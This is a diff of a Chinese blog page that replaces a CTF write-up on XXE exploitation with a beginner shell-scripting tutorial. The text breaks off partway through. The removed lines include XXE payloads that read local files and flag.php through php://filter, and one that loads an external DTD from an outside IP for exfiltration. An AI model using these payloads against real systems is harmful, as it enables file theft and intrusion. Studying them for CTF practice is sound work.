@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="xxe漏洞利用、第一次用服务器">
-<title>御林招新题：雪王生擒明珠塔</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="学习 shell 脚本的编写">
+<title>御林招新题：shell 入门</title>
 
-<link rel='canonical' href='https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-%E9%9B%AA%E7%8E%8B%E7%94%9F%E6%93%92%E6%98%8E%E7%8F%A0%E5%A1%94/'>
+<link rel='canonical' href='https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-shell%E5%85%A5%E9%97%A8/'>
 
-<link rel="stylesheet" href="/scss/style.min.b13448cb6a9f11e8e6aeb548ed55eed4ad65121ff58a1b734bc897438af28d62.css"><meta property='og:title' content="御林招新题：雪王生擒明珠塔">
-<meta property='og:description' content="xxe漏洞利用、第一次用服务器">
-<meta property='og:url' content='https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-%E9%9B%AA%E7%8E%8B%E7%94%9F%E6%93%92%E6%98%8E%E7%8F%A0%E5%A1%94/'>
+<link rel="stylesheet" href="/scss/style.min.b13448cb6a9f11e8e6aeb548ed55eed4ad65121ff58a1b734bc897438af28d62.css"><meta property='og:title' content="御林招新题：shell 入门">
+<meta property='og:description' content="学习 shell 脚本的编写">
+<meta property='og:url' content='https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-shell%E5%85%A5%E9%97%A8/'>
 <meta property='og:site_name' content='Calendar&#39;s Blog'>
-<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='CTF' /><meta property='article:published_time' content='2025-10-15T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-10-16T00:00:00&#43;00:00'/>
-<meta name="twitter:title" content="御林招新题：雪王生擒明珠塔">
-<meta name="twitter:description" content="xxe漏洞利用、第一次用服务器"><link rel="alternate" type="application/json" href="https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-%E9%9B%AA%E7%8E%8B%E7%94%9F%E6%93%92%E6%98%8E%E7%8F%A0%E5%A1%94/index.json">
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='CTF' /><meta property='article:published_time' content='2025-10-18T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-10-18T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="御林招新题：shell 入门">
+<meta name="twitter:description" content="学习 shell 脚本的编写"><link rel="alternate" type="application/json" href="https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-shell%E5%85%A5%E9%97%A8/index.json">
     </head>
     <body class="
     article-page
@@ -206,27 +206,11 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#题干">题干</a></li>
-    <li><a href="#尝试">尝试</a>
-      <ol>
-        <li><a href="#xml-的知识">XML 的知识</a>
-          <ol>
-            <li><a href="#dtd">DTD</a></li>
-          </ol>
-        </li>
-        <li><a href="#继续题目">继续题目</a>
-          <ol>
-            <li><a href="#尝试直接引入外部实体">尝试直接引入外部实体：</a></li>
-            <li><a href="#尝试引入服务器外部实体外带">尝试引入服务器外部实体、外带：</a></li>
-          </ol>
-        </li>
-      </ol>
-    </li>
-    <li><a href="#解决">解决</a>
-      <ol>
-        <li><a href="#一些启示">一些启示</a></li>
-      </ol>
-    </li>
+    <li><a href="#重定向与管道"><strong>重定向与管道</strong></a></li>
+    <li><a href="#变量与引号"><strong>变量与引号</strong></a></li>
+    <li><a href="#参数与条件判断"><strong>参数与条件判断</strong></a></li>
+    <li><a href="#循环"><strong>循环</strong></a></li>
+    <li><a href="#编写一个-shell-脚本实现以下功能"><strong>编写一个 Shell 脚本</strong>，实现以下功能：</a></li>
   </ol>
 </nav>
         </div>
@@ -254,12 +238,12 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/posts/%E5%BE%A1%E6%9E%97-%E9%9B%AA%E7%8E%8B%E7%94%9F%E6%93%92%E6%98%8E%E7%8F%A0%E5%A1%94/">御林招新题：雪王生擒明珠塔</a>
+            <a href="/posts/%E5%BE%A1%E6%9E%97-shell%E5%85%A5%E9%97%A8/">御林招新题：shell 入门</a>
         </h2>
     
         
         <h3 class="article-subtitle">
-            xxe漏洞利用、第一次用服务器
+            学习 shell 脚本的编写
         </h3>
         
     </div>
@@ -280,7 +264,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">Oct 15, 2025</time>
+                <time class="article-time--published">Oct 18, 2025</time>
             </div>
         
 
@@ -296,8 +280,235 @@
     <section class="article-content">
     
     
-    <h2 id="题干">题干
-</h2><div class="highlight"><div class="chroma">
+    <h2 id="重定向与管道"><strong>重定向与管道</strong>
+</h2><ul>
+<li>了解标准输入、标准输出、标准错误的概念。</li>
+</ul>
+<blockquote>
+<ul>
+<li><strong>标准输入（Standard Input，stdin）</strong>：默认是键盘，是程序获取输入数据的地方。例如，<code>cat</code>命令如果没有指定文件，就会从标准输入读取内容，此时你可以在键盘上输入文字，输入结束后按<code>Ctrl + D</code>（类 Unix 系统）表示输入结束，<code>cat</code>会将输入的内容输出。</li>
+<li><strong>标准输出（Standard Output，stdout）</strong>：默认是终端屏幕，是程序输出正常结果的地方。比如执行<code>ls</code>命令，会在终端显示当前目录下的文件和文件夹列表。</li>
+<li><strong>标准错误（Standard Error，stderr）</strong>：默认也是终端屏幕，用于输出程序的错误信息。例如，执行<code>ls /nonexistent</code>（假设<code>/nonexistent</code>是不存在的目录），会在终端显示类似<code>ls: cannot access '/nonexistent': No such file or directory</code>的错误信息，这就是标准错误输出。</li>
+</ul>
+</blockquote>
+<ul>
+<li>使用 <code>&gt;</code> 和 <code>&gt;&gt;</code> 操作符将命令的输出重定向到文件。</li>
+</ul>
+<blockquote>
+<ul>
+<li><code>&gt;</code>操作符：用于将命令的标准输出重定向到文件，如果文件已存在，会<strong>覆盖</strong>文件原有内容；如果文件不存在，会创建新文件。</li>
+<li><code>&gt;&gt;</code>操作符：用于将命令的标准输出以<strong>追加</strong>的方式重定向到文件，即把输出内容添加到文件原有内容的末尾，不会覆盖原有内容。</li>
+</ul>
+</blockquote>
+<ul>
+<li>使用 <code>2&gt;</code> 或 <code>2&gt;&gt;</code> 操作符将标准错误重定向到文件。</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>root@localhost hello<span class="o">]</span><span class="c1"># ls /invalid 2&gt; error.txt</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>root@localhost hello<span class="o">]</span><span class="c1"># ls /invalid_2 2&gt;&gt; error.txt</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>root@localhost hello<span class="o">]</span><span class="c1"># cat error.txt</span>
+</span></span><span class="line"><span class="cl">ls: cannot access /invalid: No such file or directory
+</span></span><span class="line"><span class="cl">ls: cannot access /invalid_2: No such file or directory
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>使用 <code>|</code> 管道操作符将一个命令的输出作为另一个命令的输入。</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>root@localhost hello<span class="o">]</span><span class="c1"># ls | grep &#39;txt&#39;</span>
+</span></span><span class="line"><span class="cl">digit_count.txt
+</span></span><span class="line"><span class="cl">error.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="变量与引号"><strong>变量与引号</strong>
+</h2><ul>
+<li>学习如何在 Shell 中定义、引用和取消定义变量。</li>
+</ul>
+<blockquote>
+<ul>
+<li>
+<p><strong>定义变量</strong>：基本语法是：<code>变量名=值</code>，等号两边不能有空格。</p>
+</li>
+<li>
+<p><strong>引用变量</strong>：使用 <code>$变量名</code> 或者 <code>${变量名}</code> 的形式。</p>
+</li>
+<li>
+<p><strong>取消定义变量</strong></p>
+</li>
+</ul>
+<p>使用 <code>unset</code> 命令可以取消定义变量，语法为：<code>unset 变量名</code>。</p>
+</blockquote>
+<ul>
+<li>理解单引号 (<code>'</code>)、双引号 (<code>&quot;</code>) 和反引号 (``) 的区别与作用。</li>
+</ul>
+<blockquote>
+<ul>
+<li>
+<p><strong>单引号（<code>'</code>）</strong>：用于包裹字符串，单引号内的所有内容都被视为普通字符，不会进行变量替换、命令替换等操作。</p>
+</li>
+<li>
+<p>**双引号（<code>&quot;</code>）：**双引号内会进行变量替换和命令替换（需要结合<code>$()</code>或反引号）</p>
+</li>
+<li>
+<p>**反引号（`<code>）**：反引号主要用于命令替换，即执行反引号内的命令，并将命令的输出作为结果返回。不过现在更推荐使用</code>$()`来进行命令替换，因为它的可读性更好，而且可以嵌套使用（反引号嵌套使用比较复杂）。</p>
+</li>
+</ul>
+</blockquote>
+<h2 id="参数与条件判断"><strong>参数与条件判断</strong>
+</h2><ul>
+<li>了解如何获取命令行参数（例如 <code>$1</code>, <code>$2</code>, <code>$#</code>）。</li>
+</ul>
+<blockquote>
+<ul>
+<li><strong><code>$1</code>、<code>$2</code>、<code>$3</code>……</strong>：分别表示第 1 个、第 2 个、第 3 个…… 命令行参数。</li>
+<li><strong><code>$#</code></strong>：表示命令行参数的个数。</li>
+<li><strong><code>$0</code></strong>：表示脚本本身的名称。</li>
+<li><strong><code>$\*</code></strong>：把所有的命令行参数当作一个整体的字符串</li>
+<li><strong><code>$@</code></strong>：把每个命令行参数当作独立的字符串</li>
+</ul>
+</blockquote>
+<ul>
+<li>掌握基本的条件判断语句（<code>if</code> 语句）。</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span>条件1<span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 条件1为真时执行的命令</span>
+</span></span><span class="line"><span class="cl"><span class="k">elif</span> <span class="o">[</span>条件2<span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 条件2为真时执行的命令</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 所有条件都为假时执行的命令</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>使用 <code>test</code> 或 <code>[]</code> 进行文件、字符串或数字的比较。</li>
+</ul>
+<blockquote>
+<p><code>test</code> 命令和 <code>[]</code>（方括号）在 Shell 中用于进行条件测试，可以对文件、字符串、数字等进行比较。<code>[]</code> 是 <code>test</code> 命令的另一种写法，使用起来更简洁。</p>
+<ul>
+<li>文件：
+<ul>
+<li>-e 存在、-f  普通文件、-d 目录、-r 可读、-w 可写、-x 可执行</li>
+</ul>
+</li>
+<li>字符串：
+<ul>
+<li>= 相等、！=不等、-z 长度是否为0、-n 长度是否不为零</li>
+</ul>
+</li>
+<li>数字：
+<ul>
+<li>-eq 相等、-ne 不相等、-gt 大于、-ge 大于等于、-lt 小于、-le 小于等于</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h2 id="循环"><strong>循环</strong>
+</h2><ul>
+<li>学习 <code>for</code> 循环和 <code>while</code> 循环的基本用法。</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">for</span> 变量 in 元素1 元素2 元素3 ...<span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 循环体，对每个元素执行的操作</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> 变量 in <span class="o">{</span>起始值..结束值<span class="o">}</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 循环体</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">while</span> 条件<span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 循环体，条件为真时执行的操作</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>能够编写简单的循环脚本来处理文件列表或执行重复任务。</li>
+</ul>
+<h2 id="编写一个-shell-脚本实现以下功能"><strong>编写一个 Shell 脚本</strong>，实现以下功能：
+</h2><ol>
+<li>
+<p><strong>参数检查</strong>：</p>
+<ul>
+<li>检查脚本是否接收到至少一个命令行参数。如果没有，打印使用说明（例如：<code>Usage: ./file_processor.sh &lt;directory&gt;</code>）并退出。</li>
+</ul>
+</li>
+<li>
+<p><strong>目录遍历</strong>：</p>
+</li>
+</ol>
+<ul>
+<li>脚本接收一个目录路径作为参数。进入该目录后，使用 <code>for</code> 循环遍历目录下的所有文件。</li>
+</ul>
+<ol start="3">
+<li>
+<p><strong>文件处理</strong>：</p>
+<ul>
+<li>
+<p>对于遍历到的每一个文件，进行以下判断：</p>
+</li>
+<li>
+<p>如果文件是<strong>普通文件</strong>（非目录），则将该文件的文件名（不包含路径）打印到标准输出。</p>
+</li>
+<li>
+<p>如果文件是<strong>可执行文件</strong>，则在文件名后面追加 <code>(Executable)</code> 字样。</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>结果输出</strong>：</p>
+<ul>
+<li>
+<p>将所有被处理的文件的输出结果（包含可执行标记）重定向到一个名为 <code>processed_files.txt</code> 的新文件中。</p>
+</li>
+<li>
+<p>最后，打印一句话，提示用户处理已完成，并说明结果已保存在 <code>processed_files.txt</code> 中。</p>
+</li>
+</ul>
+</li>
+</ol>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -316,255 +527,70 @@
 </span><span class="lnt">15
 </span><span class="lnt">16
 </span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;container&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">header</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;...&#34;</span> <span class="na">alt</span><span class="o">=</span><span class="s">&#34;雪王Logo&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;logo&#34;</span><span class="p">&gt;</span>雪王生擒明珠塔<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;mission&#34;</span><span class="p">&gt;</span>帮助雪王，向东方明珠塔的护盾发送特殊信号，找到藏在塔内的旗帜/flag。<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">header</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">main</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;input-area&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;payloadInput” class=&#34;</span><span class="na">input-label</span><span class="err">&#34;</span><span class="p">&gt;</span>在此进行你的攻击：<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">textarea</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;payloadInput&#34;</span> <span class="na">rows</span><span class="o">=</span><span class="s">&#34;12&#34;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;Enter your payload here...&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">textarea</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">button</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&#34;submitProposal()&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;attack-button&#34;</span><span class="p">&gt;</span>发起总攻<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;response-message” class=&#34;</span><span class="na">response-area</span><span class="err">&#34;</span><span class="p">&gt;</span>等待指令...<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">main</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">footer</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>雪王安全实验室 <span class="err">&amp;</span>copy；2025<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">footer</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 判断是否未传入任何参数</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> -z <span class="s2">&#34;</span><span class="nv">$*</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s1">&#39;Usage： ./file_processor.sh &lt;directory&gt;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s1">&#39;是不是没有写文件路径？&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 判断传入的参数是否为目录</span>
+</span></span><span class="line"><span class="cl"><span class="k">elif</span> <span class="o">[</span> -d <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 遍历目录下的所有文件</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> file in <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>/*<span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 判断是否为普通文件</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">[</span> -f <span class="s2">&#34;</span><span class="nv">$file</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">echo</span> -n <span class="s2">&#34;</span><span class="nv">$file</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">echo</span> -n <span class="s2">&#34;</span><span class="nv">$file</span><span class="s2">&#34;</span> &gt;&gt; processed_files.txt
+</span></span><span class="line"><span class="cl">            <span class="c1"># 判断文件是否可执行</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">[</span> -x <span class="s2">&#34;</span><span class="nv">$file</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">echo</span> -n <span class="s1">&#39;Executable&#39;</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">echo</span> -n <span class="s1">&#39;Executable&#39;</span> &gt;&gt; processed_files.txt
+</span></span><span class="line"><span class="cl">            <span class="k">fi</span>
+</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="s1">&#39;&#39;</span> <span class="c1"># 美化的作用</span>
+</span></span><span class="line"><span class="cl">    <span class="k">done</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s1">&#39;批处理已完成，结果已保存在 processed_files.txt 中&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s1">&#39;-----------------&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s1">&#39;是不是文件夹路径输错了？&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><ul>
-<li>在输入框中攻击？</li>
+</div><blockquote>
+<p>写错的点：</p>
+<ul>
+<li><code>[ -z $* ]</code>，要先写 <code>-&lt;...&gt;</code></li>
+<li><code>$file</code> 忘记改单引号为双引号了</li>
+<li><code>$1</code> 只是目录路径，<code>&quot;$1&quot;/*</code> 才是目录下所有文件</li>
+<li><code>echo</code> 默认带换行，添加 -n 参数取消</li>
 </ul>
-<h2 id="尝试">尝试
-</h2><p>抓包如图：</p>
-<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251015205717030.png"
+</blockquote>
+<p>结果如下图：</p>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251018185932433.png"
 	
 	
 	
 	loading="lazy"
 	
-		alt="image-20251015205717030"
+		alt="image-20251018185932433"
 	
 	
 ></p>
-<p>了解到可能是 <strong>xxe</strong> 漏洞</p>
-<h3 id="xml-的知识">XML 的知识
-</h3><p>基本结构：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="c">&lt;!--XML声明--&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c">&lt;!--DTD，这部分可选的--&gt;</span>          
-</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [ 
-</span></span></span><span class="line"><span class="cl"><span class="cp">    &lt;!ELEMENT foo ANY &gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="cp">&lt;!ENTITY xxe SYSTEM &#34;file:///c:/windows/win.ini&#34; &gt;</span>
-</span></span><span class="line"><span class="cl">]&gt;
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c">&lt;!--文档元素--&gt;</span>                                                           <span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="dtd">DTD
-</h4><p>外部（.dtd 文件）和内部 DTD</p>
-<p>声明方式如下：</p>
-<h5 id="内部实体">内部实体
-</h5><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE note [
-</span></span></span><span class="line"><span class="cl"><span class="cp">    &lt;!ENTITY a &#34;admin&#34;&gt;</span>
-</span></span><span class="line"><span class="cl">]&gt;
-</span></span><span class="line"><span class="cl"><span class="nt">&lt;note&gt;</span><span class="err">&amp;</span>a<span class="nt">&lt;/note&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- admin --&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h5 id="参数实体">参数实体
-</h5><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE note&gt;</span> [
-</span></span><span class="line"><span class="cl">    <span class="cp">&lt;!ENTITY % b &#34;&lt;!ENTITY b1 &#34;awsl&#34;&gt;</span>&#34;&gt;
-</span></span><span class="line"><span class="cl">    %b;
-</span></span><span class="line"><span class="cl">]&gt;
-</span></span><span class="line"><span class="cl"><span class="nt">&lt;note&gt;</span><span class="err">&amp;</span>b1<span class="nt">&lt;/note&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h5 id="外部实体">外部实体
-</h5><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE note&gt;</span> [
-</span></span><span class="line"><span class="cl">    <span class="cp">&lt;!ENTITY c SYSTEM &#34;php://filter/read=convert.base64-encode/resource=flag.php&#34;&gt;</span>
-</span></span><span class="line"><span class="cl">]&gt;
-</span></span><span class="line"><span class="cl"><span class="nt">&lt;note&gt;</span><span class="err">&amp;</span>c<span class="nt">&lt;/note&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>支持http，file等协议，不同的语言支持的协议不同</p>
-<h5 id="外部参数实体">外部参数实体
-</h5><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE note&gt;</span> [
-</span></span><span class="line"><span class="cl">    <span class="cp">&lt;!ENTITY % d SYSTEM &#34;http://47.106.143.26/xml.dtd&#34;&gt;</span>
-</span></span><span class="line"><span class="cl">    %d;
-</span></span><span class="line"><span class="cl">]&gt;
-</span></span><span class="line"><span class="cl"><span class="nt">&lt;note&gt;</span><span class="err">&amp;</span>d1<span class="nt">&lt;/note&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="c">&lt;!-- http://47.106.143.26/xml.dtd --&gt;</span>
